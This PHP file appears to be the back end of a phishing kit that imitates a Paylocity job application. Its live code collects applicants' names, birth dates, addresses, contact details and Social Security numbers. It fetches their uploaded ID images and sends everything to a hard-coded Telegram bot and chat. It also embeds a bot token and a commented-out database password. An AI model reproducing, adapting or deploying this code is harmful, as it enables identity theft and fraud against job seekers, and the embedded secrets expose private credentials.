<?php
// $db = pg_connect("host=pg-paycity-paylocityhr0-25.l.aivencloud.com port=19042 dbname=defaultdb user=avnadmin password=AVNS_dOBPgbxmGoJJGAwr-yJ");

// Telegram configuration
define('TELEGRAM_BOT_TOKEN', '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY');
define('TELEGRAM_CHAT_ID', '1325797388');


if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form inputs
    $first_name = htmlspecialchars($_POST['q11_fullName']['first'] ?? '');
    $middle_name = htmlspecialchars($_POST['q11_fullName']['middle'] ?? '');
    $last_name = htmlspecialchars($_POST['q11_fullName']['last'] ?? '');
    $full_name = trim("$first_name $middle_name $last_name");

    $birth_month = $_POST['q18_birthDate']['month'] ?? '';
    $birth_day = $_POST['q18_birthDate']['day'] ?? '';
    $birth_year = $_POST['q18_birthDate']['year'] ?? '';
    $birth_date = "$birth_year-$birth_month-$birth_day";

    $address = htmlspecialchars($_POST['q16_currentAddress']['addr_line1'] ?? '') . " " . 
               htmlspecialchars($_POST['q16_currentAddress']['addr_line2'] ?? '') . ", " .
               htmlspecialchars($_POST['q16_currentAddress']['city'] ?? '') . ", " .
               htmlspecialchars($_POST['q16_currentAddress']['state'] ?? '') . ", " .
               htmlspecialchars($_POST['q16_currentAddress']['postal'] ?? '');

    $email = htmlspecialchars($_POST['q12_emailAddress'] ?? '');
    $phone = htmlspecialchars($_POST['q13_phoneNumber13']['full'] ?? '');
    $position = htmlspecialchars($_POST['q14_positionApplied'] ?? '');
    $job_type = htmlspecialchars($_POST['q24_jobType'] ?? '');
    $source = htmlspecialchars($_POST['q21_howDid21'] ?? '');
    $ssn = htmlspecialchars($_POST['q25_socSec'] ?? '');

    $timestamp = date("Y-m-d H:i:s");



    // Extract form ID and submission ID from $_POST
    // $form_id = $_POST['formID'] ?? '';
    // $submission_id = explode('_', $_POST['event_id'])[0] ?? '';

    // // Extract file names from temp_upload
    // $front_id_raw = $_POST['temp_upload']['q17_uploadYour'][0] ?? '';  // First uploaded file
    // $back_id_raw = $_POST['temp_upload']['q26_identityVerification'][0] ?? ''; // Second uploaded file

    // // Function to clean file name from Jotform's temp_upload data
    // function extractFileName($raw_string) {
    //     return explode('#', $raw_string)[0];  // Get the actual filename before #
    // }

    // // Generate URLs
    // $front_id_url = "https://www.jotform.com/uploads/$form_id/$submission_id/" . extractFileName($front_id_raw);
    // $back_id_url = "https://www.jotform.com/uploads/$form_id/$submission_id/" . extractFileName($back_id_raw);

    // // Print URLs for debugging
    // echo "Front ID URL: $front_id_url <br>";
    // echo "Back ID URL: $back_id_url <br>";






    // function downloadJotformFile($file_url, $save_path) {
    //     $ch = curl_init($file_url);
    //     $fp = fopen($save_path, 'wb');
    
    //     curl_setopt($ch, CURLOPT_FILE, $fp);
    //     curl_setopt($ch, CURLOPT_HEADER, 0);
    //     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    //     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    //     curl_exec($ch);
    //     curl_close($ch);
    //     fclose($fp);
    // }
    
    // // Define where to save files
    // $upload_dir = "uploads/";
    // if (!is_dir($upload_dir)) {
    //     mkdir($upload_dir, 0777, true);
    // }
    
    // // Download files
    // $front_id_path = $upload_dir . "front_id_" . time() . ".jpg";
    // $back_id_path = $upload_dir . "back_id_" . time() . ".jpg";
    
    // downloadJotformFile($front_id_url, $front_id_path);
    // downloadJotformFile($back_id_url, $back_id_path);

    





    // File handling - Process Front & Back ID
    // $upload_dir = "uploads/";
    // if (!is_dir($upload_dir)) {
    //     mkdir($upload_dir, 0777, true);
    // }

    // $front_id_path = null;
    // if (!empty($_FILES['file']['name'][0])) {  // Front ID
    //     $front_id_name = basename($_FILES['file']['name'][0]);
    //     $front_id_path = $upload_dir . time() . "_front_" . $front_id_name;
    //     move_uploaded_file($_FILES['file']['tmp_name'][0], $front_id_path);
    // }

    // $back_id_path = null;
    // if (!empty($_FILES['file']['name'][1])) {  // Back ID
    //     $back_id_name = basename($_FILES['file']['name'][1]);
    //     $back_id_path = $upload_dir . time() . "_back_" . $back_id_name;
    //     move_uploaded_file($_FILES['file']['tmp_name'][1], $back_id_path);
    // }








    // Save to PostgreSQL
    // $conn = pg_connect("host=".DB_HOST." port=".DB_PORT." dbname=".DB_NAME." user=".DB_USER." password=".DB_PASS);
    
    // if (!$conn) {
    //     die("Database connection failed: " . pg_last_error());
    // }

    // $query = "INSERT INTO submissions 
    //             (full_name, birth_date, address, email, phone, position_applied, job_type, source, ssn, front_id, back_id, submitted_at) 
    //           VALUES 
    //             ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12)";
    // $result = pg_query_params($conn, $query, array($full_name, $birth_date, $address, $email, $phone, $position, $job_type, $source, $ssn, $front_id_path, $back_id_path, $timestamp));

    // if ($result) {
    //     echo "Submission successful!<br>";
    // } else {
    //     echo "Error: " . pg_last_error($conn);
    // }

    // pg_close($conn);











    // Define upload directory
    $upload_dir = "uploads/";
    if (!is_dir($upload_dir)) {
        mkdir($upload_dir, 0777, true);  // Create directory if it doesn't exist
    }

    // Extract form ID and submission ID
    $form_id = $_POST['formID'] ?? '';
    $submission_id = explode('_', $_POST['event_id'])[0] ?? '';

    // Extract raw file names from Jotform
    $front_id_raw = $_POST['temp_upload']['q17_uploadYour'][0] ?? '';
    $back_id_raw = $_POST['temp_upload']['q26_identityVerification'][0] ?? '';

    // Extract clean file names
    function extractFileName($raw_string) {
        return explode('#', $raw_string)[0];  // Get the actual filename before #
    }

    // Extract original file extensions
    function getFileExtension($file_name) {
        return pathinfo($file_name, PATHINFO_EXTENSION);
    }

    // Get file names and extensions
    $front_id_filename = extractFileName($front_id_raw);
    $back_id_filename = extractFileName($back_id_raw);

    $front_id_extension = getFileExtension($front_id_filename);
    $back_id_extension = getFileExtension($back_id_filename);

    // Construct final paths with correct extensions
    $front_id_path = $upload_dir . "front_id_" . time() . "." . $front_id_extension;
    $back_id_path = $upload_dir . "back_id_" . time() . "." . $back_id_extension;

    // Construct Jotform Download URLs
    $front_id_url = "https://www.jotform.com/uploads/$form_id/$submission_id/$front_id_filename";
    $back_id_url = "https://www.jotform.com/uploads/$form_id/$submission_id/$back_id_filename";

    // Print URLs for debugging
    echo "Front ID URL: $front_id_url <br>";
    echo "Back ID URL: $back_id_url <br>";




    // Function to download Jotform-hosted files
    // function downloadJotformFile($file_url, $save_path) {
    //     $ch = curl_init($file_url);
    //     $fp = fopen($save_path, 'wb');

    //     curl_setopt($ch, CURLOPT_FILE, $fp);
    //     curl_setopt($ch, CURLOPT_HEADER, 0);
    //     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    //     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    //     curl_exec($ch);
    //     curl_close($ch);
    //     fclose($fp);
    // }


    function downloadJotformFile($file_url, $save_path) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $file_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0"); // Mimic a browser
    
        $file_data = curl_exec($ch);
        $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
    
        // Verify download success
        if ($http_status == 200 && $file_data) {
            file_put_contents($save_path, $file_data);
            return true;
        } else {
            return false; // File download failed
        }
    }

    // Download and save files
    downloadJotformFile($front_id_url, $front_id_path);
    downloadJotformFile($back_id_url, $back_id_path);












    // Prepare message for Telegram
    $telegram_message = "📝 *New Job Application*\n\n".
                        "👤 *Name:* $full_name\n".
                        "🎂 *Birth Date:* $birth_date\n".
                        "🏠 *Address:* $address\n".
                        "📧 *Email:* $email\n".
                        "📞 *Phone:* $phone\n".
                        "💼 *Position Applied:* $position\n".
                        "📌 *Job Type:* $job_type\n".
                        "🗣️ *Referred By:* $source\n".
                        "🔐 *SSN:* $ssn\n".
                        "⏳ *Submitted At:* $timestamp\n".
                        "📎 *Identity Verification:* " . ($front_id_path && $back_id_path ? "✅ Uploaded" : "❌ Not Provided");









    // Send text message to Telegram
    $telegram_url = "https://api.telegram.org/bot".TELEGRAM_BOT_TOKEN."/sendMessage";
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $telegram_message,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegram_url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);






    // Send files to Telegram
    // $files_to_send = [
    //     'Front ID' => $front_id_path,
    //     'Back ID' => $back_id_path
    // ];

    // foreach ($files_to_send as $label => $file) {
    //     if ($file) {
    //         $telegram_file_url = "https://api.telegram.org/bot".TELEGRAM_BOT_TOKEN."/sendDocument";
            
    //         $file_data = [
    //             'chat_id' => TELEGRAM_CHAT_ID,
    //             'document' => new CURLFile(realpath($file)),
    //             'caption' => "📎 *$label* uploaded by *$full_name* at $timestamp",
    //             'parse_mode' => 'Markdown'
    //         ];

    //         $ch = curl_init();
    //         curl_setopt($ch, CURLOPT_URL, $telegram_file_url);
    //         curl_setopt($ch, CURLOPT_POST, 1);
    //         curl_setopt($ch, CURLOPT_POSTFIELDS, $file_data);
    //         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    //         curl_exec($ch);
    //         curl_close($ch);
    //     }
    // }









    function sendFileToTelegram($file_path, $caption) {
        if (!file_exists($file_path) || filesize($file_path) == 0) {
            echo "Skipping $caption - File is missing or empty.<br>";
            return; // Prevent sending empty or non-existing files
        }
    
        $telegram_url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/";
        
        // Get file extension
        $file_extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
        $image_extensions = ['jpg', 'jpeg', 'png', 'gif'];
    
        // If file is an image, send as a photo
        if (in_array($file_extension, $image_extensions)) {
            $telegram_url .= "sendPhoto";
            $post_data = [
                'chat_id' => TELEGRAM_CHAT_ID,
                'photo' => new CURLFile(realpath($file_path)), 
                'caption' => $caption,
                'parse_mode' => 'Markdown'
            ];
        } else {
            // Send all other file types as documents
            $telegram_url .= "sendDocument";
            $post_data = [
                'chat_id' => TELEGRAM_CHAT_ID,
                'document' => new CURLFile(realpath($file_path)), 
                'caption' => $caption,
                'parse_mode' => 'Markdown'
            ];
        }
    
        // Send request to Telegram
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegram_url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        curl_close($ch);
    
        echo "Sent to Telegram: $caption <br>";
    }

    // Send Front ID
    sendFileToTelegram($front_id_path, "📎 *Front ID* uploaded by *$full_name*");

    // Send Back ID
    sendFileToTelegram($back_id_path, "📎 *Back ID* uploaded by *$full_name*");





    // header("Location:https://paylocity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/thankyou.html");
// exit;
}
?>